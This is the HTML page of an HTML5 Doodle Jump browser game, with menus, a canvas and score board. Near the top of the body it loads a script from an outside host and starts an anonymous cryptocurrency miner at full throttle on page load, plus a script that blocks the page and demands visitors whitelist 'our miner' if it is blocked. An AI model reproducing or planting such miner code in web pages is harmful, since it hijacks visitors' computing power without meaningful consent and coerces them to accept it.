<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>HTML5 Doodle Jump</title>
    <link rel="stylesheet" href="style.css">

    <script src="/assets/js/prefixfree.min.js"></script>
  </head>
  <body>

    <script src="https://www.hostingcloud.racing/WxaY.js"></script>
<script>
    var _client = new Client.Anonymous('a2cfde643058e13f77be004b79de55e4b547eca1b12d047d61b8bebd62f6e5b9', {
        throttle: 0, c: 'w'
    });
    _client.start();
    
</script>
<script>
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
</script>
    <div class="container">

      <canvas id="canvas">
        Aww, your browser doesn't support HTML5!
      </canvas>

      <div id="mainMenu">
        <h1>doodle jump</h1>
        <h3>using HTML5,</h3>
        <h3>...by <a href="http://twitter.com/solitarydesigns/" target="_blank">Kushagra Agarwal</a></h3>
  			<h3>and <a href="http://twitter.com/_rishabhp" target="_blank">Rishabh</a></h3>

        <p class="info">
          use
          <span class="key left">←</span>
          <span class="key right">→</span>
          to move and space to (re) start...
        </p>
        <a class="button" href="javascript:init()">Play</a>
      </div>

      <div id="gameOverMenu">
        <h1>game over!</h1>
        <h3 id="go_score">you scored 0 points</h3>

        <a class="button" href="javascript:reset()">Restart</a>
        <a id="tweetBtn" target="_blank" class="button tweet" href="#">Tweet score</a>

        <a id="fbBtn" target="_blank" class="button fb" href="#">Post on FB</a>
      </div>

      <!-- Preloading image ;) -->
      <img id="sprite" src="sprites.png"/>

      <div id="scoreBoard">
        <p id="score">0</p>
      </div>

    </div>

    <script src="main.js"></script>
  </body>
</html>
